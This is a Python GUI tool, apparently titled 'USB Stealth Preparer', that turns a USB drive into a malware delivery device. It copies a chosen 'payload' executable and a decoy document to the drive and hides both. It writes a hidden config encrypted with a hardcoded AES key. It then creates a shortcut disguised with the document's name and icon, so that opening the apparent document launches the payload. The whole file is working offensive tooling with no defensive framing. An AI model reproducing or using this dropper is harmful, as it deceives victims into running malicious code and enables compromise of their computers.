import os
import shutil
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import ctypes
import random
import string
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
import base64

AES_KEY = base64.b64decode("WjJuKOjI7EXLwDe9xezW7sgS46vHcSp5U+BHgbZzpmQ=")

def pad(data):
    pad_len = AES.block_size - len(data) % AES.block_size
    return data + bytes([pad_len] * pad_len)

def encrypt_ini_file(path, output_path):
    with open(path, "rb") as f:
        data = f.read()
    iv = get_random_bytes(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data))
    with open(output_path, "wb") as f:
        f.write(iv + encrypted)

def hide_file(filepath):
    FILE_ATTRIBUTE_HIDDEN = 0x02
    FILE_ATTRIBUTE_SYSTEM = 0x04
    ctypes.windll.kernel32.SetFileAttributesW(filepath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)

# def random_filename(extension):
#     prefixes = ["report", "invoice", "summary", "notes", "presentation", "analysis", "budget", "q1_review", "salesdata", "project"]
#     suffix = ''.join(random.choices(string.digits, k=4))
#     return f"{random.choice(prefixes)}_{suffix}.{extension}"

def create_shortcut(usb_drive, exe_path, doc_name):
    import pythoncom
    from win32com.client import Dispatch

    shortcut_path = os.path.join(usb_drive, f"{doc_name[:-5]}.lnk")  # Match shortcut name to doc
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = exe_path
    shortcut.Arguments = f'"{os.path.join(usb_drive, doc_name)}"'
    shortcut.IconLocation = os.path.join(usb_drive, doc_name) + ",0"
    shortcut.Save()

def prepare_usb():
    usb_drive = usb_combo.get()
    exe_path = exe_entry.get()
    doc_path = doc_entry.get()
    config_path = config_entry.get()

    if not all([usb_drive, exe_path, doc_path, config_path]):
        messagebox.showerror("Error", "Please select all required files and drive.")
        return

    try:
        shutil.copy2(exe_path, usb_drive)
        # shutil.copy2(config_path, usb_drive)

        # Encrpyt the config file
        enc_config_path = os.path.join(usb_drive, ".usb_hidden_config.ini.enc")
        encrypt_ini_file(config_path, enc_config_path)
        hide_file(enc_config_path)

        # Get random new fake filename
        # doc_extension = doc_path.split('.')[-1]
        # random_doc_name = random_filename(doc_extension)

        # Keep the original name of the decoy document
        original_doc_name = os.path.basename(doc_path)
        fake_doc_path = os.path.join(usb_drive, original_doc_name)
        shutil.copy2(doc_path, fake_doc_path)

        exe_on_usb = os.path.join(usb_drive, os.path.basename(exe_path))
        config_on_usb = os.path.join(usb_drive, os.path.basename(config_path))

        # Hide EXE, hidden config, hidden real doc
        hide_file(exe_on_usb)
        hide_file(fake_doc_path)

        create_shortcut(usb_drive, exe_on_usb, original_doc_name)

        messagebox.showinfo("Success", f"USB prepared successfully!\nDecoy document: {original_doc_name}")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to prepare USB:\n{e}")

def browse_exe():
    path = filedialog.askopenfilename(title="Select Payload EXE", filetypes=[("Executable files", "*.exe")])
    exe_entry.delete(0, tk.END)
    exe_entry.insert(0, path)

def browse_doc():
    path = filedialog.askopenfilename(title="Select Decoy DOCX/PDF", filetypes=[("Documents", "*.docx *.pdf")])
    doc_entry.delete(0, tk.END)
    doc_entry.insert(0, path)

def browse_config():
    path = filedialog.askopenfilename(title="Select .ini Config", filetypes=[("INI files", "*.ini")])
    config_entry.delete(0, tk.END)
    config_entry.insert(0, path)

# --- GUI ---

root = tk.Tk()
root.title("USB Stealth Preparer (Random Doc Names)")
root.geometry("520x420")
root.resizable(False, False)

tk.Label(root, text="Select USB Drive:").pack(pady=5)
usb_combo = ttk.Combobox(root, values=[f"{d}:/" for d in "EFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:/")])
usb_combo.pack(pady=5)

tk.Label(root, text="Select Payload EXE:").pack(pady=5)
exe_entry = tk.Entry(root, width=55)
exe_entry.pack()
tk.Button(root, text="Browse", command=browse_exe).pack(pady=2)

tk.Label(root, text="Select Decoy Document:").pack(pady=5)
doc_entry = tk.Entry(root, width=55)
doc_entry.pack()
tk.Button(root, text="Browse", command=browse_doc).pack(pady=2)

tk.Label(root, text="Select Config File (.ini):").pack(pady=5)
config_entry = tk.Entry(root, width=55)
config_entry.pack()
tk.Button(root, text="Browse", command=browse_config).pack(pady=2)

tk.Button(root, text="Prepare USB", command=prepare_usb, bg="green", fg="white", font=("Arial", 11, "bold")).pack(pady=20)

root.mainloop()
